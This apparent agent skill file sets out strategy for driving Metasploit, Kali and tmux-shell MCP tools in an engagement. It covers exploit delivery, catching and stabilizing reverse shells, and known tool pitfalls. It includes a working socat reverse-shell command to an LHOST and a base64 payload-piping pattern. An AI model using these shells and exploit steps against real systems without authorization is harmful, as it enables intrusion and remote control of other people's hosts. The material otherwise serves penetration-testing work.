---
name: mcp-tooling-strategy
description: Operational strategy for the Kali / Metasploit / tmux-shell MCP tool stack — which tool to reach for when delivering an exploit, catching a shell, running a one-shot command, or holding an interactive session, plus the known reliability traps. Use whenever running Metasploit modules, catching reverse shells, driving a foothold shell, or deciding how to run a command during a network/host engagement.
---

## Purpose

The exploitation tooling in this framework spans three MCP servers with
overlapping surfaces (`kali`, `metasploit`, `tmux-shell`). Picking the wrong
one for a given job is the single most common source of wasted turns — a
session that lists as alive but can't be commanded, a shell that hangs on a
TTY query, output that can't be read back cleanly. This skill is the
decision rule so those choices are made up front rather than rediscovered
mid-engagement.

## The three jobs, and the tool for each

1. **Exploit delivery → Metasploit MCP server.** This is what it's good at:
   `list_exploits` to find a module by name/CVE, `run_exploit` with the
   module's `check` action and structured options/payload. Reliable. Make it
   the front door for any Metasploit-delivered foothold or privesc.

2. **Interactive / stateful shell → catch your own, in `tmux-shell`.** Do
   **not** rely on the Metasploit MCP's session layer for interactive work
   (see traps below — PHP Meterpreter sessions in particular list as alive
   but reject every command). Instead have the exploit deliver a *raw*
   reverse shell to a listener you control:
   - Deliver with `run_exploit` + `payload php/exec` (set `CMD` to the reverse
     shell), or msfvenom, or the RCE primitive directly — anything that runs
     one command and creates **no** MSF session.
   - Catch it in a `tmux-shell` workspace and stabilize with **`socat`** (a
     real pty on both ends), never `python3 -c pty.spawn(...)` (which hangs a
     raw shell with no controlling TTY). Listener side:
     `socat file:` + `` `tty` `` + `,raw,echo=0 tcp-listen:PORT`; target side:
     `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:PORT`.

3. **One-shot command + clean output → `kali` `execute_command` (stateless).**
   For discrete commands where you want a trustworthy returned value — a
   scan, a `curl`, a single enumeration command, or **reading a result back**
   (`cat` a logfile a stateful process wrote). Output here is deterministic,
   unlike a tmux capture-pane read.

## Reliability traps to plan around

- **Metasploit MCP session bridge is unreliable for interactive use.** A
  `php/meterpreter` session can show up in `list_active_sessions` while every
  `send_session_command` / `terminate_session` returns `"Session N not
  found"` — the RPC enumeration and the session-interaction paths disagree.
  Plain-shell payloads (`php/reverse_php`) sometimes don't register a session
  at all. Don't fight it; fall back to a self-caught shell (job #2).
- **`Rex::BindFailed` on a handler port** (e.g. 4444) can happen even when
  `list_listeners` reports no handlers — an orphaned bind. Just pick another
  `LPORT`.
- **`tmux-shell` `send_input` chokes on literal `;`, `(`, `)`** — tmux's own
  parser, not the remote shell. One command per call; base64-encode any
  payload with metacharacters/parens and send
  `echo <b64> | base64 -d | <interp>`.
- **`tmux-shell` `get_output` (capture-pane) is a human's scrollback view** —
  interleaved and ambiguous about completion. For anything you need to parse,
  have the process log to a file and read it with a stateless `execute_command`
  / `cat`, not by polling capture-pane. A leftover `C-c` can also bleed into
  the next command — send a harmless `echo` marker to resync if output looks
  wrong.

## When the Metasploit MCP session gap actually bites

The one workflow the self-caught-shell pattern doesn't cover is Metasploit
**post modules that require a live session** — most notably
`post/multi/recon/local_exploit_suggester`. If you genuinely need those and
the MCP session bridge won't sustain a session, the fallback is the raw
**`mcp__kali__metasploit_run`** tool (drive `msfconsole` directly, manage the
session with native `sessions -i`/`-C` semantics). Treat it as a narrow
fallback, not the default — for most privesc triage, manual enumeration
(linPEAS / `lse.sh` / `pspy`) covers the same ground without a session
dependency.

## Guiding principle

**Minimize held interactive sessions.** Most "interactive" steps —
enumeration, credential checks, even many exploit triggers — can be scripted
as one-shot commands through the foothold's RCE and read back statelessly.
Reserve a stabilized `tmux-shell` session for the steps that genuinely need
live, back-and-forth I/O (an interactive login, an exploit that drops you
straight into a shell). Less held state means less exposure to the traps
above.
